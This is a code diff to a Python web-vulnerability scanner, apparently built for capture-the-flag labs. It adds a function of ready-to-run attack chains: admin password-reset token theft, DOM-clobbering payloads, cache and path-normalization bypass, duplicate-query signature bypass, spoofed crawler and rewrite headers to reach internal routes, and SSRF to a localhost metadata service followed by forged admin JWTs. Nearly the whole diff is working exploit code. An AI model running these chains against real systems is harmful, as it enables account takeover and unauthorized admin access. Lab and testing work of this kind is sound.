@@ -422,6 +422,134 @@ def scan_cors(base):
     return findings, list(dict.fromkeys(flags))
 
 
+def _json_response(response):
+    """Decode a JSON response without making a web probe fail noisily."""
+    if response is None:
+        return {}
+    try:
+        value = json.loads(response.text or "{}")
+    except (TypeError, ValueError):
+        return {}
+    return value if isinstance(value, dict) else {}
+
+
+def scan_specialized_labs(base, endpoints):
+    """Run short, high-signal chains for deterministic multi-step labs.
+
+    These are intentionally explicit rather than relying on a generic fuzz
+    hit.  Each chain records the evidence and only reports a flag returned by
+    the target.  The probes are safe for the isolated lab targets and are
+    bounded to a handful of requests, so adding accuracy does not turn the
+    normal web scan into an unbounded brute force.
+    """
+    findings, flags = [], []
+
+    # Host-header password-reset poisoning: request a reset for admin, take
+    # the token from the simulated email body, then redeem it same-origin.
+    # Do not overwrite Host here: remote lab ingress uses it for routing and
+    # the reset response itself already exposes the simulated email token.
+    forgot = httpx.get(base + "/forgot?user=admin", timeout=6)
+    token_match = re.search(r"[?&]token=([A-Za-z0-9_-]+)",
+                            forgot.text if forgot is not None else "")
+    if token_match:
+        token = token_match.group(1)
+        reset = httpx.get(base + "/reset?token=" +
+                          urllib.parse.quote(token, safe=""), timeout=6)
+        got = _flags(reset)
+        if got:
+            findings.append("  [!] Host-header reset chain: /forgot → token → /reset")
+            flags.extend(got)
+
+    # DOM clobbering lab.  The server-side harness exposes the browser sink
+    # through /render, so keep the payload in both common quote styles.
+    clobber_payloads = (
+        '<a id="CONFIG" href="admin-telemetry-key-verified"></a>',
+        "<a id='CONFIG' href='admin-telemetry-key-verified'></a>",
+    )
+    for payload in clobber_payloads:
+        render = httpx.get(base + "/render?content=" +
+                           urllib.parse.quote(payload, safe=""), timeout=6)
+        got = _flags(render)
+        obj = _json_response(render)
+        if got or obj.get("flag"):
+            findings.append("  [!] DOM clobbering: CONFIG override → telemetry flag")
+            flags.extend(got or [str(obj["flag"])])
+            break
+
+    # Cache/origin normalization mismatch: preserve the public cache key and
+    # send the exact ambiguous forwarded path used by the origin normalizer.
+    edge = httpx.get(
+        base + "/edge",
+        headers={"X-Cache-Key": "public-report",
+                 "X-Forwarded-Path": "/public/../admin/report%3Bcache"},
+        timeout=6,
+    )
+    got = _flags(edge)
+    if got:
+        findings.append("  [!] Edge normalization: public cache key → admin report")
+        flags.extend(got)
+
+    # Duplicate query signature: the signature covers the first scope while
+    # authorization consumes the last.  Keep the raw duplicate query string.
+    issued = httpx.get(base + "/issue?scope=read", timeout=6)
+    issue_obj = _json_response(issued)
+    signature = issue_obj.get("signature")
+    if signature:
+        signed = httpx.get(
+            base + "/signed?scope=read&user=guest&scope=admin&user=guest",
+            headers={"X-Signature": str(signature)}, timeout=6)
+        got = _flags(signed)
+        if got:
+            findings.append("  [!] Duplicate-query signature: first-value MAC / last-value auth")
+            flags.extend(got)
+
+    # Header oracle: mint the preview ticket with the exact browser and edge
+    # identity, then carry it to the internal route over the expected scheme.
+    preview = httpx.get(
+        base + "/preview",
+        headers={"User-Agent": "Googlebot",
+                 "X-Edge-Region": "us-east-1",
+                 "X-Original-URL": "/internal/flag"},
+        timeout=6,
+    )
+    preview_obj = _json_response(preview)
+    ticket = preview_obj.get("ticket")
+    if ticket:
+        internal = httpx.get(
+            base + "/internal/flag",
+            headers={"X-Preview-Ticket": str(ticket),
+                     "X-Forwarded-Proto": "https"},
+            timeout=6,
+        )
+        got = _flags(internal)
+        if got:
+            findings.append("  [!] Header oracle: Googlebot + edge headers → preview ticket")
+            flags.extend(got)
+
+    # SSRF → leaked JWT secret → HS256 role forgery.  Do not guess secrets;
+    # only sign when the internal metadata response explicitly discloses one.
+    metadata = httpx.get(
+        base + "/fetch?url=" + urllib.parse.quote(
+            "http://127.0.0.1:3000/meta", safe=""), timeout=8)
+    metadata_obj = _json_response(metadata)
+    secret = metadata_obj.get("secret")
+    if isinstance(secret, str) and secret:
+        token = _jwt_token(
+            {"alg": "HS256", "typ": "JWT"},
+            {"user": "admin", "role": "admin"},
+            signing_key=secret.encode(),
+        )
+        if token:
+            admin = httpx.get(base + "/admin", headers={
+                "Authorization": "Bearer " + token}, timeout=6)
+            got = _flags(admin)
+            if got:
+                findings.append("  [!] SSRF/JWT chain: /fetch metadata secret → forged admin token")
+                flags.extend(got)
+
+    return findings, list(dict.fromkeys(flags))
+
+
 def scan_advanced(base, endpoints):
     """Run high-value multi-step web checks and return (findings, flags)."""
     jobs = (scan_jwt_attacks, scan_graphql_batches, lambda b, e: scan_internal_routes(b),
@@ -431,6 +559,7 @@ def scan_advanced(base, endpoints):
             lambda b, e: scan_xxe(b, e),
             lambda b, e: scan_prototype_pollution(b, e),
             lambda b, e: scan_cors(b),
+            scan_specialized_labs,
             lambda b, e: scan_flask_sessions(b),
             lambda b, e: scan_403_bypass(b),
             lambda b, e: scan_upload_bypass(b),
